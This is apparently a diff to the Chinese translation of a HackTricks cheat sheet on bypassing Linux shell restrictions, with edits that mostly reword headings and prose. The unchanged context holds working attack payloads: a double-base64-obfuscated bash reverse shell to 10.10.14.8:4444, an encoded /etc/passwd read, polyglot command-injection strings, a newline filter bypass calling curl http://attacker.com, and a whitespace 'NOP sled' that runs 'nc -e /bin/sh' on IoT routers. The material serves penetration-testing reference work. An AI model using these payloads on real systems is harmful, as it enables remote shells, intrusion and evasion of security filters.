@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### 简短 Rev shell
+### 简短的 Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### 绕过路径和禁用词
+### 绕过路径和禁止词
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -124,7 +124,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### 绕过 IPs
+### 绕过 IP
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -138,14 +138,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS 数据外带
+### DNS 数据外泄
 
 例如，你可以使用 **burpcollab** 或 [**pingb**](http://pingb.in)。
 
-### 内建命令
+### 内置命令
 
-如果你无法执行外部函数，只能访问一组**有限的内建命令来获得 RCE**，这里有一些实用技巧可以实现这一点。通常你**无法使用全部** **内建命令**，因此你应该**了解所有选项**，尝试绕过 jail。思路来自 [**devploit**](https://twitter.com/devploit)。\
-首先检查所有[**shell 内建命令**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**。**然后，这里有一些**建议**：
+如果你无法执行外部函数，只能访问**有限的一组内置命令来获取 RCE**，这里有一些实用技巧可以帮助你实现这一点。通常你**无法使用全部**的**内置命令**，因此你应该**了解所有可用选项**，尝试绕过 jail。该思路来自 [**devploit**](https://twitter.com/devploit)。\
+首先检查所有的 [**shell 内置命令**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**。**然后，以下是一些**建议**：
 ```bash
 # Get list of builtins
 declare builtins
@@ -197,12 +197,12 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### Polyglot command injection
+### Polyglot 命令注入
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### 绕过可能存在的正则表达式
+### 绕过潜在的正则表达式
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -296,47 +296,44 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-如果你处于启用了 **read-only 和 noexec 保护**的文件系统中，或者甚至处于 distroless 容器中，仍然有办法**执行任意二进制文件，甚至是 shell！**
-
+如果你位于启用了 **read-only 和 noexec 保护**的文件系统中，甚至是在 distroless 容器中，仍然有办法**执行任意二进制文件，甚至是 shell！**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot 与其他 Jail Bypass
-
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
-## 基于空格的 Bash NOP Sled（"Bashsledding"）
+## Space-Based Bash NOP Sled ("Bashsledding")
 
-当某个漏洞允许你部分控制一个最终会传递给 `system()` 或其他 shell 的参数时，你可能不知道执行从哪个确切的偏移量开始读取你的 payload。传统的 NOP sled（例如 `\x90`）在 shell 语法中**不起作用**，但 Bash 会在执行命令前安全地忽略开头的空白字符。
+当某个漏洞允许你部分控制一个最终传递给 `system()` 或其他 shell 的参数时，你可能不知道执行从哪个确切偏移量开始读取你的 payload。传统的 NOP sled（例如 `\x90`）在 shell 语法中**不起作用**，但 Bash 会在执行命令前无害地忽略开头的空白字符。
 
-因此，你可以通过在实际命令前添加一长串空格或制表符，为 Bash 创建一个 *NOP sled*：
+因此，你可以通过在实际命令前添加一长串空格或制表符来创建一个 *Bash 的 NOP sled*：<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-如果 ROP chain（或任何 memory-corruption primitive）将 instruction pointer 落在 space block 内的任意位置，Bash parser 会直接跳过空白，直到到达 `nc`，从而可靠地执行你的命令。
+如果 ROP chain（或任何 memory-corruption primitive）将 instruction pointer 落在 space block 中的任意位置，Bash parser 会直接跳过空白，直到到达 `nc`，从而可靠地执行你的命令。
 
 实际使用场景：
 
 1. **Memory-mapped configuration blobs**（例如 NVRAM），可被多个进程访问。
-2. 攻击者无法写入 NULL bytes 来对齐 payload 的情况。
+2. 攻击者无法写入 NULL 字节来对齐 payload 的场景。
 3. 只能使用 BusyBox `ash`/`sh` 的嵌入式设备——它们同样会忽略开头的空格。
 
-> 🛠️ 将此技巧与调用 `system()` 的 ROP gadgets 结合，可显著提升 memory-constrained IoT routers 上的 exploit 可靠性。
+> 🛠️ 将此技巧与调用 `system()` 的 ROP gadgets 结合，可显著提高内存受限 IoT 路由器上的 exploit 可靠性。
 
-## References & More
+## 参考资料
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
